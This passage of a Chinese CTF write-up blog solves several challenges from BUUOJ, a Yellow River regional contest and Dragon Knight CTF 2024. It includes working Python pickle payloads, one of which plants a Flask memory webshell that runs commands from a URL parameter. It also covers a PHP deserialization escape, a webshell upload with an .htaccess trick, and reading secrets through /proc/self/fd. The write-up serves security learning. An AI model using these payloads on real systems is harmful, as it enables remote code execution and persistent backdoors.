app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>我们需要知道SECRET_KEY的内容才能得到shell</p><p>下面是它的由来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br></pre></td></tr></table></figure><p>这里读取后删除了txt, 但是并没有关闭这个f, 因此可以在&#x2F;proc&#x2F;self&#x2F;fd&#x2F;[num]中读取到内容</p><p>遍历一下num即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=/proc/self/fd/3</span><br></pre></td></tr></table></figure><p>读到key内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6mjoys/T/kzPpBeY3iDkOr0wcuHIm9Ake8ygyiKhAfQ=</span><br></pre></td></tr></table></figure><p>由于无回显, 反弹shell即可</p><p> 当然还有一个非预期是直接读取&#x2F;flag</p><p>flag{4d855645-f351-4353-af7c-1a993e5b92ab}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;buuoj一次刷个够&quot;&gt;&lt;a href=&quot;#buuoj一次刷个够&quot; class=&quot;headerlink&quot; title=&quot;buuoj一次刷个够&quot;&gt;&lt;/a&gt;buuoj一次刷个够&lt;/h1&gt;&lt;h2 id=&quot;FBCTF2019-RCEService&quot;&gt;&lt;a href=&quot;#F</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>第二届黄河流域安全技能挑战赛Web</title>
    <link href="http://example.com/2024/05/30/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9BWeb/"/>
    <id>http://example.com/2024/05/30/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9BWeb/</id>
    <published>2024-05-30T05:27:49.000Z</published>
    <updated>2024-05-30T05:28:35.208Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第二届黄河流域安全技能挑战赛复现"><a href="#第二届黄河流域安全技能挑战赛复现" class="headerlink" title="第二届黄河流域安全技能挑战赛复现"></a>第二届黄河流域安全技能挑战赛复现</h1><p>题目还挺不错的, 但是赛中没做, 这里看wp复现一下</p><p>膜拜大师傅wp <a href="https://www.cnblogs.com/gxngxngxn/p/18187578">https://www.cnblogs.com/gxngxngxn/p/18187578</a></p><h2 id="myfavorPython"><a href="#myfavorPython" class="headerlink" title="myfavorPython"></a>myfavorPython</h2><p>随便传一个opcode会发现并不是反序列化执行了, 而是用pickletools.dis, 一眼看出来了,但是以为这里还以为可以注入, 没想到这里其实是flask开了debug模式 直接构造报错就可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Python-revenge"><a href="#Python-revenge" class="headerlink" title="Python-revenge"></a>Python-revenge</h2><p>这个也是在gxngxngxn师傅对python内存马的研究orz</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18187578">https://www.cnblogs.com/gxngxngxn/p/18187578</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><p>之后随便打开一个404页面就可以命令执行</p><h2 id="逃跑大师"><a href="#逃跑大师" class="headerlink" title="逃跑大师"></a>逃跑大师</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span>, <span class="variable">$end</span> + <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$A</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$B</span> = <span class="string">&quot;HELLO&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$C</span> = <span class="string">&quot;!!!&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$A</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;A = <span class="variable">$A</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$this</span>-&gt;B . <span class="string">&quot;[welcome sdpcsec&quot;</span> .<span class="variable">$this</span>-&gt;C . <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;escape&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$Class</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;escape&#x27;</span>]);</span><br><span class="line">    <span class="variable">$Key</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$Class</span>);</span><br><span class="line">    <span class="variable">$K</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;SDPCSEC&quot;</span>, <span class="string">&quot;SanDieg0&quot;</span>, <span class="variable">$Key</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$K</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察mb_strpos与mb_substr执行差异导致的漏洞</p><p>这里我也测试了一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$start</span> . <span class="string">&#x27; &#x27;</span> . <span class="variable">$data</span>[<span class="variable">$start</span>] . <span class="string">&#x27;&lt;/br&gt;&#x27;</span> ;</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$end</span> . <span class="string">&#x27; &#x27;</span> .  <span class="variable">$data</span>[<span class="variable">$end</span>] . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span>, <span class="variable">$end</span> + <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$_GET</span>[<span class="number">0</span>] . <span class="string">&quot;[welcome sdpcsec&quot;</span> .<span class="variable">$_GET</span>[<span class="number">1</span>] . <span class="string">&quot;]&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$key</span>;</span><br></pre></td></tr></table></figure><p>首先是<code>%9f</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515184216748.png" alt="image-20240515184216748"></p><p>可以看见这里的mb_strpos是直接忽略了<code>%9f</code>这个不可见字符, 而mb_substr并没有忽略, 而是正常处理, 这导致返回的字符整体向前移了一位</p><p>再来看<code>%f0</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515193637458.png" alt="image-20240515193637458"></p><p>这里mb_strpos是正常识别的, mb_substr把<code>%f0</code> 连着后面的三个字符识别成了一个字符</p><p>在mb_substr看来, 第0个字符是<code>%f0[we</code> , 第一个字符是<code>l</code> , 然后连着输出了后面21个字符</p><p>因此,<code>%9f</code>用来增加一个字符，<code>%f0</code>用来减少三个字符，我们利用这个特性，可以实现任意字符的构造</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515201303695.png" alt="image-20240515201303695"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240515202049157.png" alt="image-20240515202049157"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第二届黄河流域安全技能挑战赛复现&quot;&gt;&lt;a href=&quot;#第二届黄河流域安全技能挑战赛复现&quot; class=&quot;headerlink&quot; title=&quot;第二届黄河流域安全技能挑战赛复现&quot;&gt;&lt;/a&gt;第二届黄河流域安全技能挑战赛复现&lt;/h1&gt;&lt;p&gt;题目还挺不错的, 但是赛中没</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Dragon Knight CTF 2024</title>
    <link href="http://example.com/2024/05/30/Dragon-Knight-CTF-2024/"/>
    <id>http://example.com/2024/05/30/Dragon-Knight-CTF-2024/</id>
    <published>2024-05-30T03:42:58.000Z</published>
    <updated>2024-05-30T03:44:27.153Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>直接扫码</p><h2 id="神秘文字"><a href="#神秘文字" class="headerlink" title="神秘文字"></a>神秘文字</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">𓅂=+![];𓂀=+!𓅂;𓁄=𓂀+𓂀;𓊎=𓁄+𓂀;𓆣=𓁄*𓁄;𓊝=𓊎+𓁄;𓆫=𓁄*𓊎;𓅬=𓆣+𓊎;[𓇎,𓏢,𓆗,𓃠,𓃀,𓋌,𓏁,𓇲,𓁣,𓁺,𓏁,𓇲,𓆦,𓏁,𓁣,𓇲,𓄬,𓇲,𓁣,𓏁,𓋌,𓁣,𓇲,𓏁,𓋌,𓇲]=(𓆡=&#x27;\\&quot;&#x27;)+!!𓆡+!𓆡+𓆡.𓆡+&#123;&#125;;𓆉=𓇲+𓁣+𓆦+𓁺+𓆗+𓃠+𓃀+𓇲+𓆗+𓁣+𓃠,𓆉=𓆉[𓆉][𓆉],𓄦=𓏁+𓁣+𓄬+𓆦,𓄀=𓃠+𓋌+𓆗+𓃀+𓃠+𓆦+&quot; &quot;;𓆉(𓆉(𓄀+𓏢+𓆉(𓄀+[...&quot;𓇎𓂀𓅂𓅬𓇎𓂀𓂀𓅬𓇎𓂀𓂀𓅬𓇎𓂀𓅂𓆣𓇎𓆣𓂀𓇎𓂀𓊎𓂀𓇎𓂀𓂀𓅬𓇎𓂀𓁄𓊝𓇎𓂀𓆫𓁄𓇎𓆣𓅂𓇎𓂀𓆫𓅂𓇎𓂀𓅂𓂀𓇎𓂀𓆫𓊎𓇎𓂀𓆫𓊎𓇎𓂀𓁄𓅬𓇎𓂀𓊝𓅬𓇎𓂀𓆫𓁄𓇎𓂀𓆣𓆣𓇎𓆣𓅂𓇎𓂀𓊝𓂀𓇎𓂀𓆫𓊎𓇎𓅬𓁄𓇎𓂀𓊝𓊝𓇎𓂀𓅂𓂀𓇎𓂀𓆫𓁄𓇎𓂀𓆫𓆣𓇎𓆫𓂀𓇎𓂀𓂀𓆫𓇎𓂀𓊎𓅬𓇎𓂀𓂀𓊎𓇎𓆫𓂀𓇎𓂀𓅂𓊝𓇎𓂀𓁄𓅂𓇎𓂀𓆫𓅂𓇎𓆫𓊎&quot;][𓄦]`+`)``+𓏢)``)``</span><br></pre></td></tr></table></figure><p>一眼jsFuck</p><p>放到本地node环境运行</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526202432238.png" alt="image-20240526202432238" /><p>拿到压缩包密码 mArt1N_K1EPp3</p><p>DRKCTF{D0_Y0u_KnOw_Wh0_Creat3_J5Fu*K?}</p><h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="羡慕群友每一天"><a href="#羡慕群友每一天" class="headerlink" title="羡慕群友每一天"></a>羡慕群友每一天</h2><p>谷歌识图直接可以识别到这个视频， 和图片里的摩天轮一模一样</p><p><a href="https://www.youtube.com/watch?app=desktop&v=2JY1s5UysPk&ab_channel=ActionKid">https://www.youtube.com/watch?app=desktop&amp;v=2JY1s5UysPk&amp;ab_channel=ActionKid</a></p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240525143303296.png" alt="image-20240525143303296" /><p>去谷歌地图找到精确位置</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240525143102076.png" alt="image-20240525143102076" /><p>DRKCTF{美国-佛罗里达州-迈阿密市-Skyviews}</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezsign"><a href="#ezsign" class="headerlink" title="ezsign"></a>ezsign</h2><p>进去之后是一个登录，admin&#x2F;admin</p><p>是一个前端的留言板， 没什么用</p><p>扫描一下目录</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526190725821.png" alt="image-20240526190725821" /><p> 可以看见还是能扫描出来很多东西，包括.DS_Store</p><p>github上随便找一个利用的.DS_Store工具， 我这里用的是ds_store_exp</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526193540195.png" alt="image-20240526193540195" /><p>主要看这个index.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 检查 cookie 中是否有 token</span></span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$token</span>);</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$token</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$token</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$token</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$isLocal</span> = <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$isLocal</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$isLocal</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome Back，&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;!&#x27;</span>;</span><br><span class="line">        <span class="comment">//如果 upload 目录下存在$username.png文件，则显示图片</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;upload/&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$token</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">            <span class="comment">// 显示图片，缩小图片</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;upload/&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$token</span>[<span class="string">&#x27;filename&#x27;</span>] .<span class="string">&#x27;&quot; width=&quot;200&quot;&gt;&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;请上传您高贵的头像。&#x27;</span>;</span><br><span class="line">            <span class="comment">// 写一个上传头像的功能</span></span><br><span class="line">            <span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">            &lt;form method=&quot;post&quot; action=&quot;upload.php&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            EOD</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// echo &quot;留个言吧&quot;;</span></span><br><span class="line">        <span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">        &lt;h1&gt;留言板&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;label for=&quot;input-text&quot;&gt;Enter some text:&lt;/label&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; id=&quot;input-text&quot; placeholder=&quot;Type here...&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;button onclick=&quot;displayInput()&quot;&gt;Display&lt;/button&gt;</span></span><br><span class="line"><span class="string">        EOD</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Login&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;Login&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=&quot;post&quot; action=&quot;./login.php&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; required&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; required&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOD</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">displayInput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> inputText = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&quot;input-text&quot;</span>).value;</span><br><span class="line">      document.<span class="title function_ invoke__">write</span>(inputText)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>里面有一个上传文件的功能点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;upload.php&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload&quot;</span>&gt;</span><br><span class="line">            &lt;/form&gt;</span><br></pre></td></tr></table></figure><p>要进入这个功能点需要满足 <code>$isLocal</code>为真</p><p>注意到这个<code>extract($_GET);</code></p><p>可以通过get传参直接去覆盖$_SERVER[‘REMOTE_ADDR’]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$isLocal</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是其实这里也完全没必要, 直接给把那段上传的html代码粘贴到网站里给upload.php上传文件就行, 这里我们正常做</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526194419508.png" alt="image-20240526194419508" /><p>这里上传一个php木马, 直接去upload目录下访问是不会解析的, 原因未知, 一开始猜测是用了file_get_contents, 但是当我尝试传了一个.htaccess再访问时发现403了</p><p>那么构造.htaccess把png解析成php</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526194928431.png" alt="image-20240526194928431" /><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526195805665.png" alt="image-20240526195805665" /><p>之后yijian连接即可</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526195921876.png" alt="image-20240526195921876" /><h2 id="EzLogin"><a href="#EzLogin" class="headerlink" title="EzLogin"></a>EzLogin</h2><p>进去看网站源码有一个提示&#x2F;register.html 可以注册用户</p><p>先随便注册一个账号 abc&#x2F;123, 去登录得到一个cookie, 并且提示我们不是admin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">65794a3163325679626d46745a534936496d46695979497349434a306232746c62694936496a6b774d4445314d446b344d324e6b4d6a526d596a426b4e6a6b324d3259335a4449345a5445335a6a637949697767496d6c7a5832466b62576c75496a6f7766513d3d</span><br></pre></td></tr></table></figure><p>一眼hex, 